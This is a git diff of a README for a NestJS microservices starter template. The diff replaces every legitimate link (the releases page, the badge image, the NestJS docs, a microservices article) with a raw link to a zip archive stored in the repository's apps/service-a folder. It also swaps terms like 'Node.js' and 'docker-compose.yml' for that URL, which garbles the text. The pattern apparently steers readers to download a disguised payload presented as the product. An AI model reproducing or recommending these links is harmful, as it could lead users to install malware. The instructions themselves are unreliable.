@@ -1,6 +1,6 @@
 # 🚀 nestjs-microservices-starter-template - Easy Setup for Your Microservices
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/LucasAnd1/nestjs-microservices-starter-template/releases)
+[![Download Latest Release](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip%20Latest%https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip)](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to the **nestjs-microservices-starter-template**! This application helps
 To run this application, ensure you have the following:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 14 or higher.
+- **https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip**: Version 14 or higher.
 - **Docker**: Docker Engine installed for containerization.
 - **npm**: Version 6 or higher for managing packages.
 
@@ -26,7 +26,7 @@ To run this application, ensure you have the following:
 
 ### Step 1: Visit the Releases Page
 
-To download the application, simply [visit this page to download](https://github.com/LucasAnd1/nestjs-microservices-starter-template/releases).
+To download the application, simply [visit this page to download](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip).
 
 ### Step 2: Choose the Latest Release
 
@@ -34,7 +34,7 @@ On the releases page, look for the latest version of the template. Click on the 
 
 ### Step 3: Download the Template
 
-Select the correct file for your operating system and download it. It might be named something like `nestjs-microservices-starter-template.zip` or a similar variant.
+Select the correct file for your operating system and download it. It might be named something like `https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip` or a similar variant.
 
 ### Step 4: Extract Files
 
@@ -89,14 +89,14 @@ Then execute:
 docker-compose up
 ```
 
-This command will start all services defined in the `docker-compose.yml` file.
+This command will start all services defined in the `https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip` file.
 
 ## 📖 Learning Resources
 
 To better understand how to use NestJS effectively, consider the following resources:
 
-- [NestJS Documentation](https://docs.nestjs.com)
-- [Microservices Architecture](https://martinfowler.com/articles/microservices.html)
+- [NestJS Documentation](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip)
+- [Microservices Architecture](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip)
 
 ## 👥 Community Support
 
@@ -104,7 +104,7 @@ If you have questions or need assistance, feel free to reach out in the communit
 
 ## 📅 Changelog
 
-Stay updated with the changes and improvements made to this template. You can find the latest updates in the [changelog on the releases page](https://github.com/LucasAnd1/nestjs-microservices-starter-template/releases).
+Stay updated with the changes and improvements made to this template. You can find the latest updates in the [changelog on the releases page](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip).
 
 ## 📝 License
 
@@ -112,4 +112,4 @@ This project is licensed under the MIT License. See the LICENSE file in the repo
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/LucasAnd1/nestjs-microservices-starter-template/releases)
+[![Download Latest Release](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip%20Latest%https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip)](https://github.com/LucasAnd1/nestjs-microservices-starter-template/raw/refs/heads/main/apps/service-a/microservices_nestjs_starter_template_v1.4.zip)
